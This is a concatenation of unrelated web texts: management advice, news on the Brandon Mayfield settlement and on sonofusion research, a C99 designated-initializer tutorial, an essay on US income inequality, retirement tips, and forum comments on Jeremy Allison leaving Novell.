So the smart manager must delegate , in part , to keep learning new ways to do things .
The best managers build trust with their team , every day , in every meeting , so that eventually critically important and complex tasks can be delegated away .
If a manager feels his team is n’t capable , his job is to figure out exactly what they ’re capable of , and then helping them to grow : things that only happen by delegating work and seeing what happens .
People need the opportunity to prove themselves and that opportunity is only granted by the manager .
If it turns out that work is done poorly , was too hard or the goals were n’t set properly , then as a manager , you have a living example to discuss and explore with the person in question .
You can work to understand what your expectations of each other were and what they should be .
Those conversations , openly exploring the differences in perspective of the manager and the worker , is the heart of management .
It is where trust is built and lessons for how to make better work happen are discovered .
Find a mentor
Whenever you take on a new role or challenge it ’s a great idea to find someone who ’s done that thing before and who is willing to give you advice .
I used to think I was cool for learning everything on my own .
Turns out it ’s often a waste of time :
If having a tutor or guide can get me the same progress in half the effort ( or more progress in the same time ) of going solo , why not take the help ?
Some people look to their own managers to mentor them : there are two downsides to this .
First , some managers are not good mentors : they ’re interested more in results or getting things done than they are in coaching or giving advice .
Second , by finding a mentor who is not your boss , you can get advice on your boss ’ behavior .
If you find the term mentor goofy , fine .
Pick someone who you respect who has experience as a manager , and say “ Hey – if I buy you lunch once a month , will you give me some advice on how to manage people ? ”
That ’s it .
Friends can work , but again , the further removed your mentor is from your current inner circle , the better perspective they ’ll be able to give you on what you ’re doing .

Story Highlights • Oregon lawyer Brandon Mayfield says he was constantly watched
• " We lived in ' 1984 , ' " he said , referring to George Orwell 's novel
• Mayfield was falsely arrested for taking part in the 2004 Madrid train bombings
• Mayfield settled false arrest suit against the government for $ 2 million
Adjust font size :
PORTLAND , Oregon ( CNN ) -- The U.S. Justice Department said Wednesday it is paying $ 2 million and apologizing to an Oregon lawyer wrongly accused of being involved with the 2004 train bombings in Madrid , Spain .
Brandon Mayfield was arrested in Portland on a material witness warrant in May 2004 , less than two months after the bombings .
According to an FBI affidavit at the time , his fingerprint was identified as being on a blue plastic bag containing detonators found in a van used by the bombers .
The FBI 's fingerprint identification was wrong , however , and Mayfield was released several days later .
The bombings of four commuter trains March 11 , 2004 , killed 191 people and wounded more than 1,800 .
Mayfield charged he was a victim of profiling because the Portland - area attorney was a Muslim convert .
He and his family later sued the U.S. government for damages .
" We lived in 1984 , " Mayfield told reporters Wednesday .
" I 'm talking about the George Orwell , frightening brave new world in which Big Brother is constantly watching you . "
( Watch Mayfield discuss the case )
" I , myself , have dark memories of stifling paranoia , of being monitored , followed , watched , tracked , " he said , choking back emotion .
" I 've been surveilled , followed , targeted primarily because I 've been an outspoken critic of this administration and doing my job to defend others who can't defend themselves , to give them their day in court , and mostly for being a Muslim . "
The government refused , he said , to tell him where they put their cameras and surveillance devices , leaving his family wondering if their private conversations and intimate moments were on display .
" The days and weeks and months following my arrest were some of the hardest and darkest that myself and my family have ever had to endure , " he said .
" And all because of this government 's ill - conceived war on terror .
...
What I really want is for this not to happen to anyone else . "
Wednesday 's settlement includes not only a $ 2 million payment and an apology , but also an agreement by the government to destroy communications intercepts conducted by the FBI against Mayfield 's home and office during the investigation .
The written apology reads :
" The United States of America apologizes to Mr. Brandon Mayfield and his family for the suffering caused by the FBI 's misidentification of Mr. Mayfield 's fingerprint and the resulting investigation of Mr. Mayfield , including his arrest as a material witness in connection with the 2004 Madrid train bombings and the execution of search warrants and other court orders in the Mayfield family home and in Mr. Mayfield 's law office . "
A Justice Department statement released Wednesday said Mayfield was not targeted because of his Muslim faith and that the FBI had taken steps to improve its fingerprint identification process " to ensure that what happened to Mr. Mayfield does not happen again . "
" Mr. Mayfield and his family felt it was in their best interest to get on with their lives , " said Mayfield 's attorney , Elden Rosenthal .
" No amount of money can compensate Mr. Mayfield for being held as a prisoner and being told he faced the death penalty [ for the Madrid bombings ] . "
Mayfield said his suit was not about money .
" It 's about regaining our civil rights , our freedom and most important , our privacy , " he said .
He and his attorneys said the settlement will allow him to continue the portion of his lawsuit challenging the constitutionality of the Patriot Act .
Mayfield contends that his home was searched under provisions of the Patriot Act .
Last year , I discovered , thanks to the book “ C , A Reference Manual “ , a great C99 feature : designated initializers .
Designated initializers allow you to initialize components of an aggregate ( structure , union or array ) by specifying their names within an initializer list .
Arrays initialization
What most people normally use to initialize an array is the following idiom :
int v[ 4 ] = { 4 , 2 , 1 , -5 } ;
in which you need to initialize each component of the array sequentially .
Designated initializers allow you to specify which component of the array you want to initialize .
Thus , we could write the line above as :
int v [ 4 ] = { [ 1 ] = 2 , [ 2 ] = 1 , [ 0 ] = 4 , [ 3 ] = - 5 } ;
Note that we have specified the component indexes which has allowed us to initialize the array with our desired order .
If we do not initialize all the components , those not initialized will get 0 values .
We can also mix both methods , so the line below would be also correct :
int v [ 4 ] = { [ 1 ] = 2 , 1 , [ 3 ] = - 5 } ;
in which the component not referenced goes right after the named one .
A possible use of this kind of initializations would be a mapping between a list of identifiers and a list of strings .
//
The public interface typedef enum { id_one , id_two , id_three } id_t ; extern char const * string_by_id ( id_t id ) ; // The private implementation static char const* strings [ ] = { [ id_one ] = " identifier one " , [ id _two ] = " identifier two " , [ id_three ] = " identifier three " } ; char const * string_by_id ( id_t id ) { return strings [ id ] ; }
Structures and unions initialization
Designated initializers are also useful to initialize components of structures and unions by their name .
In this case , the component to be initialized takes the form .c , where c is the name of the component .
So , suppose we have the following structure :
struct point { float x ; float y ; float z ; } ;
we could initialize each component of a struct point variable like this :
struct point my_point = { .x = 0.34 , .y = 0.98 , .z = 1.56 } ;
With unions , we will use the same method , so having the following union :
union integer { unsigned char int_8 ; unsigned short int int_16 ; unsigned long int_32 ; } ;
we can initialize it by any of its components :
union integer value = { .int_16 = 24000 } ;
Finally , we can merge both cases , so we can have arrays of structures or unions that can be initialized using designated initializers :
struct point pointvector [ 3 ] = { [ 0 ] .x = 0.34 , [ 0 ] .y = 1.78 , [ 0 ] .z = 3.18 , [ 1 ] = { .x = 3.5 , .y = 6.89 } , [ 2 ] = { .y = 2.8 , 1.23 } } ;

Physicist claims to have definitive data , but can they be replicated ?
Imploding bubbles , caught on film emitting light .
Are they emitting energy from fusion too ?
© D. Flannigan and K.S. Suslick , University of Illinois at Urbana - Champaign
Can the popping of tiny bubbles trigger nuclear fusion , a potential source of almost unlimited energy ?
This controversial idea is back on the table , because its main proponent has new results that , he claims , will silence critics .
But others say that the latest experiment simply comes with its own set of problems .
The idea is simple enough .
Blast a liquid with waves of ultrasound and tiny bubbles of gas are created , which release a burst of heat and light when they implode .
The core of the bubble reaches 15,000 °C , hot enough to wrench molecules apart .
Physicists have even suggested that the intense conditions of this sonoluminescence could fuse atomic nuclei together , in the same process that keeps our Sun running .
Physicist Rusi Taleyarkhan of Purdue University in West Lafayette , Indiana , published the first evidence1 of this ' sonofusion ' in 2002 ; he has been dogged by sceptics ever since .
The underlying physics behind the idea is valid , says Ken Suslick .
An expert in sonoluminescence at the University of Illinois in Urbana - Champaign , Suslick tried and failed to replicate Taleyarkhan 's first results .
If the bubbles ' collapse is sufficiently intense , it should indeed be able to crush atoms together .
Taleyarkhan just has n't done enough to prove it , says Suslick .
Needle in a haystack
Taleyarkhan 's first experiments were conducted while he was based at Oak Ridge National Laboratory in Tennessee .
His idea was to use liquid acetone in which hydrogen atoms had been replaced by their heavier brethren , deuterium .
When deuterium nuclei fuse together , they emit a characteristic burst of neutrons .
But critics pointed out that Taleyarkhan was using an external source of neutrons to ' seed ' the bubbles , and that these were swamping his measurements of neutrons produced by the fusion reaction itself .
" This time round there are no external neutrons , " he explains .
Instead , his team loaded a mixture of deuterated acetone and benzene with a uranium salt .
As the uranium undergoes radioactive decay it releases alpha particles , which can also seed bubble formation , says Taleyarkhan .
" In this experiment we use three independent neutron detectors and a gamma - ray detector , " he adds .
The results from the four instruments prove that fusion is happening inside his experiment , asserts Taleyarkhan .
Although uranium can release neutrons during fission reactions , Taleyarkhan rules them out because the neutrons he finds bear the energetic hallmark of having come from the fusion of two deuterium nuclei2 .
Taleyarkhan 's test reactor still puts out a lot less energy than it takes in , making it impractical for generating power .
" We have a way to go before we break even , " he admits .
But in the meantime , he adds , it could be a cheap source of neutrons for analysing the structure of materials .
The results are to be published in Physical Review Letters in a few weeks ' time .
Unreliable sources
There is one big problem , however : the experiment does n't always work , and the group is not sure why .
Seth Putterman , a physicist at the University of California , Los Angeles , who has also tried to verify some of Taleyarkhan 's experiments , notes that the paper does not reveal how many failed runs were required before the team saw a trace of fusion neutrons .
" As a paper it does n't convince me , " says Putterman .
Putterman notes that the team did not continuously monitor background neutron levels .
Although the neutron count doubles at some points in the experiments , Putterman says that neutrons produced in random showers of cosmic rays , rather than fusion events , could be responsible .
But Taleyarkhan points out that the neutron count was smaller in detectors further from the reaction chamber .
To prove that the neutrons are coming from fusion as bubbles burst , Putterman and Suslick suggest that the team closely monitor exactly when the neutrons appear .
The current experiment simply counts up the number of neutrons detected over minutes , so correlations with bubble bursts cannot be seen .
" The key to improving the signal is timing , " says Putterman .
Finding proof
Another obvious way to confirm that fusion is happening would be to look for tritium , a heavier isotope of hydrogen produced by fusion reactions .
Tritium leaves a telltale signature of high - energy electrons when it decays and Taleyarkhan claimed to see this in similar previous experiments 1,3 .
But in the current tests , tritium 's signature is overwhelmed by ?- decay from the uranium , making it impossible to spot .

Given that Suslick and Putterman have both investigated Taleyarkhan 's past claims , they think it odd that they were not consulted by the editors of Physical Review Letters about the paper .
" There are other people who are very knowledgeable about this , " comments Martin Blume , editor - in - chief of the American Physical Society .
Taleyarkhan says that Suslick and Putterman are welcome to visit his lab to see the results for themselves .
Both are eager to go as soon as possible .
" We look forward to seeing the experiment run , " says Putterman .
At lunch on a recent afternoon in the Hemispheres cafeteria , the two major Googler factions , engineers and sales representatives , tended to sit segregated at long tables .
It was easy to tell them apart : engineers wore jeans , T - shirts and sneakers ; sales representatives wore suits , no tie .
There was nary a designer handbag or gray hair in the room .
But you ’re wrong about who the cool kids are .
At last , engineers are the big men ( and a few women ) on campus .
“ These are power geniuses , ” said Jane Risen , a statuesque brunette who works in training for the sales staff and is considered among the best dressed on campus — she was wearing a brown blazer from the Gap .
“ If they do n’t have the same social skill or style sense , they ’re extremely interesting people or else they do n’t get hired . ”
The power geniuses are more straight - laced than some of their predecessors in Silicon Alley .
During New York ’s original dot - com boom , the entrepreneur Josh Harris of Pseudo.com was known for decadent parties in his loft offices that featured live sex shows .
DoubleClick was the host of a legendary Willy Wonka - themed party for 2,000 with bartenders as orange Oompa Loompas .
The current Silicon Alley resurgence has brought back a bit of that tradition — the guys of CollegeHumor.com have been celebrating the largess of a multimillion - dollar investment from Barry Diller by holding dance parties at a TriBeCa loft — but the naughtiest it gets for Manhattan Googlers is custom - made trans fat - free ice - cream sandwiches .
FOOD is a major perk at the Manhattan Googleplex .
Every Tuesday afternoon , tea with crumpets and scones is served .
In the cafeteria a dry - erase board lists local purveyors of the ingredients in the meals like a sign at the Union Square Greenmarket .
( Dry - erase boards are big in Google culture ; ideas flow quickly ) .
All the free food has created a problem familiar to college freshmen .
“ Everyone gains 10 or 15 pounds when they start working here , ” said James Tipon , a member of the sales team , who actively contributes to the four pounds of M&Ms consumed by New York Googlers daily .
“ I definitely gained that when I started working here , but I think I shed some of it , ” Mr. Tipon said .
“ I try to be disciplined but it ’s really hard . ”

AMERICANS do not go in for envy .
The gap between rich and poor is bigger than in any other advanced country , but most people are unconcerned .
Whereas Europeans fret about the way the economic pie is divided , Americans want to join the rich , not soak them .
Eight out of ten , more than anywhere else , believe that though you may start poor , if you work hard , you can make pots of money .
It is a central part of the American Dream .
The political consensus , therefore , has sought to pursue economic growth rather than the redistribution of income , in keeping with John Kennedy 's adage that “ a rising tide lifts all boats . ”
The tide has been rising fast recently .
Thanks to a jump in productivity growth after 1995 , America 's economy has outpaced other rich countries ' for a decade .
Its workers now produce over 30 % more each hour they work than ten years ago .
In the late 1990s everybody shared in this boom .
Though incomes were rising fastest at the top , all workers ' wages far outpaced inflation .
But after 2000 something changed .
The pace of productivity growth has been rising again , but now it seems to be lifting fewer boats .
After you adjust for inflation , the wages of the typical American worker — the one at the very middle of the income distribution — have risen less than 1 % since 2000 .
In the previous five years , they rose over 6 % .
If you take into account the value of employee benefits , such as health care , the contrast is a little less stark .
But , whatever the measure , it seems clear that only the most skilled workers have seen their pay packets swell much in the current economic expansion .
The fruits of productivity gains have been skewed towards the highest earners , and towards companies , whose profits have reached record levels as a share of GDP .
Even in a country that tolerates inequality , political consequences follow when the rising tide raises too few boats .
The impact of stagnant wages has been dulled by rising house prices , but still most Americans are unhappy about the economy .
According to the latest Gallup survey , fewer than four out of ten think it is in “ excellent ” or “ good ” shape , compared with almost seven out of ten when George Bush took office .
The White House professes to be untroubled .
Average after - tax income per person , Mr Bush often points out , has risen by more than 8 % on his watch , once inflation is taken into account .
He is right , but his claim is misleading , since the median worker — the one in the middle of the income range — has done less well than the average , whose gains are pulled up by the big increases of those at the top .
Privately , some policymakers admit that the recent trends have them worried , and not just because of the congressional elections in November .
The statistics suggest that the economic boom may fade .
Americans still head to the shops with gusto , but it is falling savings rates and rising debts ( made possible by high house prices ) , not real income growth , that keep their wallets open .
A bust of some kind could lead to widespread political disaffection .
Eventually , the country 's social fabric could stretch .
“ If things carry on like this for long enough , ” muses one insider , “ we are going to end up like Brazil ” — a country notorious for the concentration of its income and wealth .
America is nowhere near Brazil yet ( see chart 1 ) .
Despite a quarter century during which incomes have drifted ever farther apart , the distribution of wealth has remained remarkably stable .
The richest Americans now earn as big a share of overall income as they did a century ago ( see chart 2 ) , but their share of overall wealth is much lower .
Indeed , it has barely budged in the few past decades .
The elites in the early years of the 20th century were living off the income generated by their accumulated fortunes .
Today 's rich , by and large , are earning their money .
In 1916 the richest 1 % got only a fifth of their income from paid work , whereas the figure in 2004 was over 60 % .
The not - so - idle rich
The rise of the working rich reinforces America 's self - image as the land of opportunity .
But , by some measures , that image is an illusion .
Several new studies * show parental income to be a better predictor of whether someone will be rich or poor in America than in Canada or much of Europe .
In America about half of the income disparities in one generation are reflected in the next .
In Canada and the Nordic countries that proportion is about a fifth .
It is not clear whether this sclerosis is increasing : the evidence is mixed .
Many studies suggest that mobility between generations has stayed roughly the same in recent decades , and some suggest it is decreasing .
Even so , ordinary Americans seem to believe that theirs is still a land of opportunity .
The proportion who think you can start poor and end up rich has risen 20 percentage points since 1980 .
That helps explain why voters who grumble about the economy have nonetheless failed to respond to class politics .
John Edwards , the Democrats ' vice - presidential candidate in 2004 , made little headway with his tale of “ Two Americas ” , one for the rich and one for the rest .
Over 70 % of Americans support the abolition of the estate tax ( inheritance tax ) , even though only one household in 100 pays it .
Americans tend to blame their woes not on rich compatriots but on poor foreigners .
More than six out of ten are sceptical of free trade .
A new poll in Foreign Affairs suggests that almost nine out of ten worry about their jobs going offshore .
Congressmen reflect their concerns .
Though the economy grows , many have become vociferous protectionists .
Other rich countries are watching America 's experience closely .
For many Europeans , America 's brand of capitalism is already far too unequal .
Such sceptics will be sure to make much of any sign that the broad middle - class reaps scant benefit from the current productivity boom , setting back the course of European reform even further .
The conventional tale is that the changes of the past few years are simply more steps along paths that began to diverge for rich and poor in the Reagan era .
During the 1950s and 1960s , the halcyon days for America 's middle class , productivity boomed and its benefits were broadly shared .
The gap between the lowest and highest earners narrowed .
After the 1973 oil shocks , productivity growth suddenly slowed .
A few years later , at the start of the 1980s , the gap between rich and poor began to widen .
The exact size of that gap depends on how you measure it .
Look at wages , the main source of income for most people , and you understate the importance of health care and other benefits .
Look at household income and you need to take into account that the typical household has fallen in size in recent decades , thanks to the growth in single - parent families .
Look at statistics on spending and you find that the gaps between top and bottom have widened less than for income .
But every measure shows that , over the past quarter century , those at the top have done better than those in the middle , who in turn have outpaced those at the bottom .
The gains of productivity growth have become increasingly skewed .
If all Americans were set on a ladder with ten rungs , the gap between the wages of those on the ninth rung and those on the first has risen by a third since 1980 .
Put another way , the typical worker earns only 10 % more in real terms than his counterpart 25 years ago , even though overall productivity has risen much faster .
Economists have long debated why America 's income disparities suddenly widened after 1980 .
The consensus is that the main cause was technology , which increased the demand for skilled workers relative to their supply , with freer trade reinforcing the effect .
Some evidence suggests that institutional changes , particularly the weakening of unions , made the going harder for people at the bottom .
Whether these shifts were good or bad depends on your political persuasion .
Those on the left lament the gaps , often forgetting that the greater income disparities have created bigger incentives to get an education , which has led to a better trained , more productive workforce .
The share of American workers with a college degree , 20 % in 1980 , is over 30 % today .
The excluded middle
In their haste to applaud or lament this tale , both sides of the debate tend to overlook some nuances .
First , America 's rising inequality has not , in fact , been continuous .
The gap between the bottom and the middle — whether in terms of skills , age , job experience or income — did widen sharply in the 1980s .
High - school dropouts earned 12 % less in an average week in 1990 than in 1980 ; those with only a high - school education earned 6 % less .
But during the 1990s , particularly towards the end of the decade , that gap stabilised and , by some measures , even narrowed .
Real wages rose faster for the bottom quarter of workers than for those in the middle .
After 2000 most people lost ground , but , by many measures , those in the middle of the skills and education ladder have been hit relatively harder than those at the bottom .
People who had some college experience , but no degree , fared worse than high - school dropouts .
Some statistics suggest that the annual income of Americans with a college degree has fallen relative to that of high - school graduates for the first time in decades .
So , whereas the 1980s were hardest on the lowest skilled , the 1990s and this decade have squeezed people in the middle .

First , pick your parents
The one truly continuous trend over the past 25 years has been towards greater concentration of income at the very top .
The scale of this shift is not visible from most popular measures of income or wages , as they do not break the distribution down finely enough .
But several recent studies have dissected tax records to investigate what goes on at the very top .
The figures are startling .
According to Emmanuel Saez of the University of California , Berkeley , and Thomas Piketty of the Ecole Normale Supérieure in Paris , the share of aggregate income going to the highest - earning 1 % of Americans has doubled from 8 % in 1980 to over 16 % in 2004 .
That going to the top tenth of 1 % has tripled from 2 % in 1980 to 7 % today .
And that going to the top one - hundredth of 1 % — the 14,000 taxpayers at the very top of the income ladder — has quadrupled from 0.65 % in 1980 to 2.87 % in 2004 .
Put these pieces together and you do not have a picture of ever - widening inequality but of what Lawrence Katz of Harvard University , David Autor of the Massachusetts Institute of Technology and Melissa Kearney of the Brookings Institution call a polarisation of the labour market .
The bottom is no longer falling behind , the top is soaring ahead and the middle is under pressure .
Superstars and super - squeezed
Can changes in technology explain this revised picture ?
Up to a point .
Computers and the internet have reduced the demand for routine jobs that demand only moderate skills , such as the work of bank clerks , while increasing the productivity of the highest - skilled .
Studies in Britain and Germany as well as America show that the pace of job growth since the early 1990s has been slower in occupations that are easy to computerise .
For the most talented and skilled , technology has increased the potential market and thus their productivity .
Top entertainers or sportsmen , for instance , now perform for a global audience .
Some economists believe that technology also explains the soaring pay of chief executives .
One argument is that information technology has made top managers more mobile , since it no longer takes years to master the intricacies of any one industry .
As a result , the market for chief executives is bigger and their pay is bid up .
Global firms plainly do compete globally for talent : Alcoa 's boss is a Brazilian , Sony 's chief executive is American ( and Welsh ) .
But the scale of America 's income concentration at the top , and the fact that no other country has seen such extreme shifts , has sent people searching for other causes .
The typical American chief executive now earns 300 times the average wage , up tenfold from the 1970s .
Continental Europe 's bosses have seen nothing similar .
This discrepancy has fostered the “ fat cat ” theory of inequality : greedy businessmen sanction huge salaries for each other at the expense of shareholders .
Whichever explanation you choose for the signs of growing inequality , none of the changes seems transitory .
The middle rungs of America 's labour market are likely to become ever more squeezed .
And that squeeze feels worse thanks to another change that has hit the middle class most : greater fluctuations in people 's incomes .
The overall economy has become more stable over the past quarter century .
America has had only two recessions in the past 20 years , in 1990 - 91 and 2001 , both of which were mild by historical standards .
But life has become more turbulent for firms and people 's income now fluctuates much more from one year to the next than it did a generation ago .
Some evidence suggests that the trends in short - term income volatility mirror the underlying wage shifts and may now be hitting the middle class most .
What of the future ?
It is possible that the benign pattern of the late 1990s will return .
The disappointing performance of the Bush era may simply reflect a job market that is weaker than it appears .
Although unemployment is low , at 4.6 % , other signals , such as the proportion of people working , seem inconsistent with a booming economy .
More likely , the structural changes in America 's job market that began in the 1990s are now being reinforced by big changes in the global economy .
The integration of China 's low - skilled millions and the increased offshoring of services to India and other countries has expanded the global supply of workers .
This has reduced the relative price of labour and raised the returns to capital .
That reinforces the income concentration at the top , since most stocks and shares are held by richer people .
More important , globalisation may further fracture the traditional link between skills and wages .
As Frank Levy of MIT points out , offshoring and technology work in tandem , since both dampen the demand for jobs that can be reduced to a set of rules or scripts , whether those jobs are for book - keepers or call - centre workers .
Alan Blinder of Princeton , by contrast , says that the demand for skills depends on whether they must be used in person : X - rays taken in Boston may be read by Indians in Bangalore , but offices cannot be cleaned at long distance .
So who will be squeezed and who will not is hard to predict .
The number of American service jobs that have shifted offshore is small , some 1 m at the most .
And most of those demand few skills , such as operating telephones .
Mr Levy points out that only 15 radiologists in India are now reading American X - rays .
But nine out of ten Americans worry about offshoring .
That fear may be enough to hold down the wages of college graduates in service industries .
All in all , America 's income distribution is likely to continue the trends of the recent past .
While those at the top will go on drawing huge salaries , those in the broad middle of the middle class will see their incomes churned .
The political consequences will depend on the pace of change and the economy 's general health .
With luck , the offshoring of services will happen gradually , allowing time for workers to adapt their skills while strong growth will keep employment high .
But if the economy slows , Americans ' scepticism of globalisation is sure to rise .
And even their famous tolerance of inequality may reach a limit .

Retirement is one of the most important goals for most people .
Unfortunately , many workers and retirees have an incomplete or misleading picture of how much they need to save , how to invest their savings effectively , and how to make their money last as long as they live .
Clearing up common misconceptions about retirement is essential to allow people to fulfill their dreams of a comfortable retirement .
A joint project by LIMRA International , the Society of Actuaries and Mathew Greenwald & Associates identified the following 10 ways in which Americans lack a realistic understanding of retirement saving .
Saving too little – Most people have n’t tried to estimate how much money they will need for retirement and those who have tried to do the calculation often underestimate their income needs .
Not knowing when retirement will occur – Many workers will retire before they expect to , and before they ’re ready .
Living longer than planned –
As individuals manage their own retirement funds , they may not understand that life expectancy is a very limited planning tool .
In fact , some retirees will live long beyond their life expectancies , with a substantial risk of outliving their savings .
Not facing facts about long - term care – Many people underestimate their chances of needing long - term health care .
Relatively few people either own long - term care insurance or can afford to self - insure an extended long - term care situation .
Trying to self - insure against long life – Although people may find guaranteed lifetime income attractive , in practice they usually choose to receive retirement plan benefits in lump - sum form .
They pass up opportunities to get a lifetime pension or annuity , failing to recognize the difficulty of self - insuring their longevity .
Not understanding investments –
Due to the growth of the workplace retirement savings plans , workers are now largely responsible for managing investments for retirement .
However , many workers misunderstand investment returns , expenses , and how each investment vehicle works .
Relying on poor advice – Many retirees and pre-retirees indicate a strong desire to work with a financial professional , yet fail to see this guidance .
Not knowing sources of retirement income – Workers often do n’t understand what their primary sources of income will be in retirement .
They may be surprised and disappointed when they try to live on the income that is actually available .
Failing to deal with inflation – Inflation is a fact of life that workers may deal with through pay increases , but after retirement few people can increase their income to keep pace with the cost of living .
Not providing for a surviving spouse – Many married couples fail to plan for the eventual death of one spouse before the other .
Identifying these common misconceptions is an important first step .
If you recognize yourself in any , or many of these scenarios , take corrective action right away .
Get an accurate estimate of your retirement income needs , identify your sources of income after retirement and understand your investment and distribution options .
Take the time to educate yourself in areas of personal finance and retirement planning , and if needed , seek advice from a professional .

I briefly met Jeremy Allison a couple of years ago at a Linux Expo in London ,
and I listened to him on the GPL3 discussion panel at the London Linux Expo a
couple of months ago ( just days before the Novell / MS pact was announced ) .
At that time , and again today , he strikes me as an extraordinarily talented ,
smart and very principled person .
He 's made a clearly very difficult decision ,
and has stuck to the principles he believes in .
I thank him for that , and I hope that others will make the similarly difficult
but necessary decisions .

I read this comment on OSNEWS and it spoke volumes to me and it really helped to
understand just how insidious this deal between Novell and Microsoft .
Sigh ........

Given that Microsoft is taking market share and customers away from Novell , and
Novell 's CEO has admitted it , can anyone give a good business reason as to why
Microsoft would want to sell Novell 's own distribution ?
The answer is , there
is n't , apart from the ulterior motives already discussed .
It should also be
noted that Novell is actually paying royalties to Microsoft for those SLES
licenses .
Hovsepian basically sold his company for a measly few hundred million , and
Microsoft moved a bit closer towards what they always wanted - a distinction
between the free distributions and open source community and a licensed version
of Linux blessed by them .
I 'm also not getting this interoperability thing in any way shape or form ;
probably because it does n't exist .
There was nothing in the current version of
SLE that was written in any way with the help of Microsoft , Microsoft is not
moving towards using ODF , Microsoft contributed no code towards Samba ( and has
actively slapped down some Microsoft engineers who 've tried to help in the past )
and has done nothing about virtualising Windows under Linux .
Hovsepian said in an interview that interoperability and virtualisation was a
problem , and they lost customers to Microsoft because of it ( hey , Microsoft is
going to help Novell win customers back ! ) , but I see nothing that Microsoft is
helping with .
We , and Novell , have had the option of VMware for years , and Xen
will run Windows - it 's just that it can't do it without the aid of some
hardware , which is coming along .
Novell should just have done a deal with VMware
for the time being .
Can anyone point to some projects Microsoft has started and
some code Microsoft has contributed to make this famed interoperability happen ?
If not , then Novell got absolutely nothing out of this deal .

After reading the limitations placed on developers who code for Novell , does he really have a choice if he wishes his code to continue to be under the GPL ?
He 's made some very good points with regards to the license , Novell 's breach and the analogy with regards to MS EULA .
I 'd be interested in finding out his take on the limitations that are being placed on any developer who agrees to code for Novell .

... you must " treat all recipients of the code equally " .
For example it specifically says " if you distribute copies of such a program , whether gratis or for a fee " ... " and you may at your option offer warranty protection in exchange for a fee " .
So you can charge different recipients different prices .
Also you could be rude to some recipients and polite to others .
You do n't need to provide documentation in all their native languages .
Etc .
Jeremy Allison is basically right about the patent issue , but there 's no reason to believe that " the intent of the GPL licence the Samba code is released under ... is to treat all recipients of the code equally " .
It 's about freedom , not equality , and these are never the same - giafly .

Usually if you working on a project and your employer make a decision you can 't

Since Samba is GPL there is no question that he can take it with him .

You know , it 's nice and fuzzy that JA sticks to his
" convictions " ... but JA himself acknowledges that Novell is ok by the
letter of GPL v2 .
So where 's the problem ?
He answers that question , saying
they are pariahs to the community .
The reality is obvious - there is no
violation of the GPL , just bad PR caused by FUD over the deal .
For that , PJ and
other notables in the community are to blame .
I do n't expect this message to
survive .
But I ask PJ and all in the community to seriously consider the
possibility that Novell has not acted wrongly , but rather , that her / we in the
OSS community have self - destructed over this one and caused the ensuing
mess ... and it need not have happened .
Sometimes the best approach to dealing
with a move that you do n't agree with ( esp if it does n't violate the letter of
the GPL ) is to just let it be .

There are times when " doing the right thing " means doing something

considering the qualifications of the individual involved .
I congratulate Mr.
Allison for taking what he judges to be the morally correct course of action ,

circumstances .

Hire this man , he has a strong sense of morality and will do the

The MS Exchange example highlights something interesting about the GPL and the nature of FLOSS software .
We have no trouble imagining a company of whatever size reacting if they found that their licensing or contracts were at all disadvantageous to their goals ( which is usually making money . )
We have a harder time imagining what will happen when the GPL is violated , because there 's no entity behind it .
Remember , the FSF makes the license , but not the software .
It 's the copyright holders that must act in a legal sense .
The fact that Novell and other pundits cry foul when the licensing changes to protect the interests of the copyright holders should be surprising .
A company would act the same way .
The difference is that companies normally just trade in money .
If you want a proprietary company to change their licensing agreement with you so that you can bundle their software with your own to sell it , if you give them enough money and negotiate the specifics , it 's very likely they 'll agree .
But what people who contribute to FLOSS want is not really money , but the freedom aspect to be unchanged .
And since this is the very thing that Novell and other companies want , there 's no deal that can be made .
What surprises me is how business keeps forgetting the fairy tale of the golden goose .
The goose was killed to try to get all of the eggs at once , and it was found to be empty .
It was n't the goose that people wanted , it was the eggs .
So why do companies make the same mistake , over and over again ?
How do they forget how this software became so powerful and useful in the first place ?
How it continues to grow and evolve , at an astounding pace ?
It 's the libre part of the license that make this possible ; it 's a world of programmers adding to it , probably on a 24/ 7 basis worldwide , because they want it shared and free .
If you remove that , you 've killed the goose .
And all you get is a nice goose dinner for that one evening , and no more eggs afterwards .
I hope that Novell enjoys their roasted goose banquet right now .
My advice to them is to save the leftovers , because that 's all they 're going to be eating going forward .

In the event that he is pointed here and reads this , I would just like to extend
my best wishes to him in his future endeavors .
If nothing else , he has proven
to be an upstanding member of the community .
As for Novell , I still wonder if this whole thing was n't Microsoft 's idea to do ,
well , exactly what it is doing -- divide the community ?
It would certainly
explain a few things ...
Not that it excuses it , but I wonder ...
Whatever else , Microsoft has proven adept at killing its competitors time and
again , via means legal and illegal alike .
I have sincere doubts that it has
ever or will ever stop the practice of killing them off .
I even remember
objecting to one of the anti-trust settlements I ended up being a party to due
to an old copy of Windows 98 in that the settlement did * NOTHING * to halt the
injury .
There was n't even a vague promise of changed behavior in the future ...
it was as if they'd bought a license to monopolize things for the last six or so
years with the implication that we could have exactly the same settlement in
another six with absolutely nothing changing .

Hmm , so he 's leaving because of the - perception - that Novell has violated the GPL .
Good job to Groklaw and everyone else who has no clue what the real agreement was about , and who instead just assume the worst becase it involves Microsoft .
Granted , if Allison does n't even know the full details , then he should n't jump ship quite yet either , particularly given Novell 's past .
We so easily forget ( or ignore ) the possibility that Novell could have discovered something that would take years upon years to litigate to receive damages , in the end receiving less in damages , factoring in costs of litigation , than they can get right now with a quiet agreement with Microsoft .
Novell probably is n't allowed to tell even their full staff about it , much less the public .
What ever happened to " innocent until proven guilty " ?
I have read something before that said if you have a grievance with someone , you approach them first to try to resolve it .
If that fails , you come back with a friend .
If all else fails , you make your claims public .
For all we know , Novell could have Microsoft by the jewels because of some Novell patent that - Microsoft - is violating , and Microsoft might expect it to take five years to get the offending methods of concepts out of their products .
Do you think Microsoft would agree to keep this out of the courts if it were made public ?
Think about all of the other private settlements following lawsuits , and how they will never see the light of day .
What I 'm stressing is that WE DO NOT KNOW what the full agreement is about , so we should n't make assumptions , particularly if we are very high - profile individuals or organizations .
" Do you think that if we'd have found what we legally considered a clever way around the Microsoft EULA so we did n't have to pay for Microsoft licenses and had decided to ship , oh let 's say , " Exchange Server " under this " legal hack " that Microsoft would be silent about it - or we should act aggr [ i ] eved when they change the EULA to stop us doing this ? "
Microsoft would not be silent , but they could not do anything about it .
Microsoft can yell at me all they want , but if I have not done anything wrong , they can take a hike .
It would come to a point of " put up or shut up " .
If I really enjoyed distributing / selling Exchange under such a situation and if my customers were satisfied or even happy , then I should be upset after Microsoft changed their license to prevent such a thing .
I would be losing a part of my business revenue , and my customers would be losing a product or service that they found beneficial .
